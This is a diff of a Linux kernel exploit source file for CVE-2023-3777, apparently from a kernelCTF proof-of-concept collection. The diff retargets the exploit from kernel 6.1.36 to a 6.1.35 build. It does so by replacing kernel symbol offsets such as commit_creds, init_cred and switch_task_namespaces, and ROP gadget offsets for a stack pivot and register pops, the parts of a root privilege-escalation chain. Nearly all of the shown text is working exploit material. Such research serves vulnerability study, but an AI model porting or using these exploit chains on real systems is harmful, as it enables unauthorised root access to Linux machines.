--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit.c
@@ -1,5 +1,5 @@
 #include "kexploit.h"
-__kexploit_src_metadata("{\"original_kernel_name\":\"kernelctf_6.1.36_lts\",\"current_kernel_name\":\"kernelctf_6.1.36_lts\"}")
+__kexploit_src_metadata("{\"original_kernel_name\":\"kernelctf_6.1.36_lts\",\"current_kernel_name\":\"build_6.1.35_lts\"}")
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -26,13 +26,13 @@
 
 #include "netlink_utils.h"
 
-uint64_t find_task_by_vpid_off = __kexploit_kernel_offset(0x1b5600);
-uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0x1bd180);
-uint64_t commit_creds_off = __kexploit_kernel_offset(0x1bed10);
-uint64_t init_nsproxy_off = __kexploit_kernel_offset(0x26765c0);
-uint64_t init_cred_off = __kexploit_kernel_offset(0x2676800);
-uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_kernel_offset(0x12010c6);
-uint64_t nft_counter_ops_off = __kexploit_kernel_offset(0x1b26680);
+uint64_t find_task_by_vpid_off = __kexploit_kernel_offset(0x1ce3f0);
+uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0x1d6320);
+uint64_t commit_creds_off = __kexploit_kernel_offset(0x1d8080);
+uint64_t init_nsproxy_off = __kexploit_kernel_offset(0x2a767a0);
+uint64_t init_cred_off = __kexploit_kernel_offset(0x2a769e0);
+uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_kernel_offset(0x1401106);
+uint64_t nft_counter_ops_off = __kexploit_kernel_offset(0x1d41540);
 
 // new offsets
 // uint64_t find_task_by_vpid_off = 0xbb6f0;
@@ -74,13 +74,13 @@
 // uint64_t pop_rsp_ret = 0x282a0;
 
 uint64_t push_rbx_pop_rsp = __kexploit_rop_offset(0xf5b269, "push rbx; and byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; jmp 0xffffffff82404b80");
-uint64_t pop_rdi_ret = __kexploit_rop_offset(0x88893, "pop rdi; jmp 0xffffffff82404b80");
-uint64_t pop_rsi_ret = __kexploit_rop_offset(0xd88a3, "pop rsi; jmp 0xffffffff82404b80");
+uint64_t pop_rdi_ret = __kexploit_rop_offset(0x2cb9, "pop rdi; jmp 0xffffffff82404b80");
+uint64_t pop_rsi_ret = __kexploit_rop_offset(0x1e8e1e, "pop rsi; jmp 0xffffffff82404b80");
 uint64_t mov_rdi_rax_ret = __kexploit_rop_offset(0x1142a6b, "mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; jmp 0xffffffff82404b80");
 uint64_t add_rax_rsi_ret = __kexploit_rop_offset(0x36590, "add rax, rsi; jmp 0xffffffff82404b80");
-uint64_t pop_rcx_ret = __kexploit_rop_offset(0x271ec, "pop rcx; jmp 0xffffffff82404b80");
+uint64_t pop_rcx_ret = __kexploit_rop_offset(0x3fe43, "pop rcx; jmp 0xffffffff82404b80");
 uint64_t mov_rax_rcx_ret = __kexploit_rop_offset(0x72342b, "mov qword ptr [rax], rcx; jmp 0xffffffff82404b80");
-uint64_t pop_rsp_ret = __kexploit_rop_offset(0x68961, "pop rsp; jmp 0xffffffff82404b80");
+uint64_t pop_rsp_ret = __kexploit_rop_offset(0x2c49, "pop rsp; jmp 0xffffffff82404b80");
 
 uint64_t nft_counter_ops = 0;
 uint64_t kbase = 0;
